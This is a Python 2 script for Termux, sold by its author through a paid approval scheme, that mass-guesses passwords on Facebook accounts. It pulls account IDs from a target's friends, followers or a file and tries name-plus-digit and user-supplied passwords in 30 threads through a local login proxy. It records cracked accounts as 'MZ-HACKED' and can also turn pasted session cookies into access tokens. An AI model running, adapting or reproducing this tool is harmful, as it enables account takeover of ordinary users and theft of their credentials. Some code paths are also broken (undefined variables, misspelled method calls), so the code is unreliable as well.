# Rana mz
# Nam tu suna huga

import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Rana-MZ'
__copyright = 'All rights reserved . Copyright  rana mz'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

try:
    os.mkdir('/sdcard/RanaMZ/ex_ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')

def logo():
    os.system('echo -e "\n  Coder +  Author   : Rana MZ   \xe2\x95\x91\n\xe2\x95\x91  HAHA   : NAM TU SUNA HUGA   \xe2\x95\x91           \n\xe2\x95\x91  FaceBook       :  RANA MZ   \xe2\x95\x91\n\xe2\x95\x91  Author2    : Inteq Al [ SUNNY ]   \xe2\x95\x91\n\xe2\x95\x91  HAHA SUN   : DoNT TRy TO COPy ME BECAUS iM THE 0NE   \xe2\x95\x91      \n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n" | lolcat')


def logo1():
    os.system('echo -e "\n\n(1) Login With id/pass \n\n(2) Login With Token\n\n(3) Login Cookies\n\n(4) BanglaDesH olD iDs Cloning \n\n(6) indian olD iDs Cloning \n\n(7) PakisTani iDs Cloning \n\n(8) Target iD Hack     " | lolcat')


def logo2():
    os.system('echo -e "\n\n(1) Auto Pass Cloning \n\n(2) Digit Pass Cloning\n\n(3) Name Pass Cloning \n\n" | lolcat')


def logo3():
    os.system('echo -e "\n\n(1) Public Friendlist Cloning  \n\n(2) Follower Cloning \n\n(3) File Cloning" | lolcat')


def logo4():
    os.system('echo -e "\n\n(1) Public Friendlist Crack  \n\n(2) File Cracking\n\n(0) exit" | lolcat')


idg = []

def reg():
    os.system('clear')
    logo()
    print ''
    os.system('echo -e "\n\n\xe2\x8b\x9f                 WelcoM To My Tool" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f =============================================" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f      Please wait.... " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f =============================================" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f                             Loding....... " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f     Loding...... " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f                         Running...... " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f.  please wait....... " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f   Coder + Author iZ Rana MZ" | lolcat')
    
    os.system('echo -e "\n\n\xe2\x8b\x9f Checking approval...." | lolcat')
    time.sleep(1)
    try:
        to = open('/sdcard/.Andriod.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/RANAMZ-zeshi/mz-ok/main/server.txt').text
    if to in r:
        os.system('cd mz && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd mz && node index.js &')
        time.sleep(5)
        g()
    else:
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\n\n\xe2\x8b\x9f  Approved Failed" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f =============================================" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f       SORY BRO TOOL iZ NOT FREE " | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f =============================================" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f              FOR APROVAL " | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f ============================================= " | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f           You Need  Buy My Tool  " | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f ============================================= " | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f   Send 300 To Oner Jazz Cash Acount" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f.  Jazz Cash Number : 0308 9085973 " | lolcat')  
        os.system('echo -e "\n\n\xe2\x8b\x9f ============================================= " | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f  Your key is Not Approved" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f  Copy The id and send to Tool owner" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f The Approval For Login" | lolcat')
        print '\x1b[0;31m\xe2\x8b\x9f \x1b[1;92mYour id: \x1b[0;36m' + to
        raw_input('\x1b[0;31m\xe2\x8b\x9f\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/waqas.tahir.794')
        reg()


def reg2():
    os.system('clear')
    logo()
    os.system('echo -e "\n\n\xe2\x8b\x9f Approval not detected" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f =============================================" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f       SORY BRO TOOL iZ NOT FREE " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f =============================================" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f              FOR APROVAL " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f ============================================= " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f           You Need  Buy My Tool  " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f ============================================= " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f   Send 300 To Oner Jazz Cash Acount" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f.  Jazz Cash Number : 0308 9085973 " | lolcat')  
    os.system('echo -e "\n\n\xe2\x8b\x9f ============================================= " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Copy Your Key and Press Enter" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Select FaceBook To Countinue" | lolcat')
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    raw_input(' Press enter to go to My FaceBook ')
    os.system('xdg-open https://www.facebook.com/waqas.tahir.794')
    sav = open('/sdcard/.Andriod.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def g():
    os.system('clear')
    logo()
    print '\x1b[1;91mTool Verification using your key'
    print
    ip = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Your-key :  ')
    if ip == '6050-100-5':
        os.system('clear')
        logo()
        print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-key : (Confirmed)'
        ss = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) your confermation-key : ')
        if ss == '100-463-7-0':
            os.system('clear')
            logo()
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-key : (Confirmed)'
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) your confermation-key : (Confirmed)'
            time.sleep(1)
            print ''
            print '\x1b[1;92m \xe2\x9c\x93 \x1b[1;93m Good'
            time.sleep(1)
            login_menu()
        else:
            print '[!] your confermation-key : ' + ss + ' (Wrong)'
            time.sleep(1)
            g()
    else:
        print '[!] your confermation-key : ' + ip + ' (Wrong)'
        time.sleep(1)
        g()


def login_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        logo()
        os.system('echo -e "-------LOGIN MENU-------" | lolcat')
        logo1()
        print 47 * '-'
        log_menu_s()


def log_menu_s():
    s = raw_input('\x1b[1;96m>> ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    elif s == '4':
    	os.system('python2 rana.mz')
    elif s == '6':
    	os.system('python2 indclon.py')
    elif s == '7':
    	os.system('python2 pakclone.py')
    elif s == '8':
    	os.system('python2 firecrack.py')
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    logo()
    print '   \x1b[101m\x1b[37;1mLOGIN Fb-ID\x1b[0m'
    print
    lid = raw_input('\x1b[1;92m Id/mail/no: ')
    pwds = raw_input(' \x1b[1;93mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ' User must verify account before login'
            raw_input('\x1b[1;92m Press enter to try again ')
            log_fb()
        else:
            print ' Id/Pass may be wrong'
            raw_input(' \x1b[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    logo()
    print '   \x1b[101m\x1b[37;1mLOGIN FB-TOKEN\x1b[0m'
    print 47 * '-'
    tok = raw_input('\x1b[1;92mPaste Token : \x1b[1;91m')
    print 47 * '-'
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    logo()
    print '   \x1b[101m\x1b[37;1mLOGIN FB-COOKIES\x1b[0m'
    print ''
    print ''
    try:
        cookie = raw_input(' Paste cookies : ')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\x1b[1;31;1mLogin FB id to continue'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.ranamz.txt', 'r').read()
    print ''
    print '  \x1b[1;92mLogged in user: ' + z
    print ''
    print ' \x1b[1;93m Active token: ' + tok
    print ''
    print ' ------------------------------------------ '
    print ''
    print '\x1b[1;92m[1] Choice Passwords digits'
    print '\x1b[1;92m[2] Extract Link For File'
    print '\x1b[1;92m[3] View token'
    print '\x1b[1;92m[4] Logout'
    print '\x1b[1;92m[5] Delete trash files'
    print ''
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;92m\xe2\x95\xb0\xe2\x94\x80Rana MZ\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('clear')
        print '[!] Please Wait While Page Is Loding.'
        os.system('python2 ok.py')
        time.sleep(1)
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
    elif ms == '5':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def crack():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1m Choice pass Cloning '
    print ''
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    print ''
    a_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1m Choice pass cracking'
    print ''
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    print ''
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80Rana MZ\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m Choice pass public Cloning'
        print ''
        print '\x1b[1;93m Like Az: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        pass4 = raw_input('\x1b[1;92m[4]Password: ')
        pass5 = raw_input('\x1b[1;92m[5]Password: ')
        pass6 = raw_input('\x1b[1;92m[6]Password: ')
        pass7 = raw_input('\x1b[1;92m[7]Password: ')
        pass8 = raw_input('\x1b[1;92m[8]Password: ')
        idt = raw_input('\x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;31;1m Choice pass public cracking'
            print ''
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' \x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m choice pass pass followers Cloning'
        print ''
        print ' \x1b[1;93mLike Az: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        pass4 = raw_input('\x1b[1;92m[4]Password: ')
        pass5 = raw_input('\x1b[1;92m[5]Password: ')
        pass6 = raw_input('\x1b[1;92m[6]Password: ')
        pass7 = raw_input('\x1b[1;92m[7]Password: ')
        pass8 = raw_input('\x1b[1;92m[8]Password: ')
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;31;1m choice pass followers cracking '
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('\x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m choice pass File Cloning'
        print ''
        print '\x1b[1;93m like Az: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        pass4 = raw_input('\x1b[1;92m[4]Password: ')
        pass5 = raw_input('\x1b[1;92m[5]Password: ')
        pass6 = raw_input('\x1b[1;92m[6]Password: ')
        pass7 = raw_input('\x1b[1;92m[7]Password: ')
        pass8 = raw_input('\x1b[1;92m[8]Password: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        print ''
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;93m Cloning Start '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mRanaMZ [ Nam Tu Suna Huga ]\x1b[0;97m'
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[MZ-HACKED] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[RANA MZ-CP] ' + uid + ' | ' + pass1
                cp = open('MZ_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[MZ-HACKED] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[RANA MZ-CP] ' + uid + ' | ' + pass2
                    cp = open('MZ_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[MZ-HACKED] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[RANA MZ-CP] ' + uid + ' | ' + pass3
                        cp = open('MZ_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[MZ-HACKED] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[RANA MZ-CP] ' + uid + ' | ' + pass4
                            cp = open('MZ_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[MZ-HACKED] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[RANA MZ-CP] ' + uid + ' | ' + pass5
                                cp = open('MZ_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[MZ-HACKED] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[RANA MZ-CP] ' + uid + ' | ' + pass6
                                    cp = open('MZ_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[MZ-HACKED] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[RANA MZ-CP] ' + uid + ' | ' + pass7
                                        cp = open('MZ_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[MZ-HACKED] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[RANA MZ-CP] ' + uid + ' | ' + pass8
                                            cp = open('MZ_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \x1b[1;92mProcess Has Been Completed'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()


if __name__ == '__main__':
    reg() 
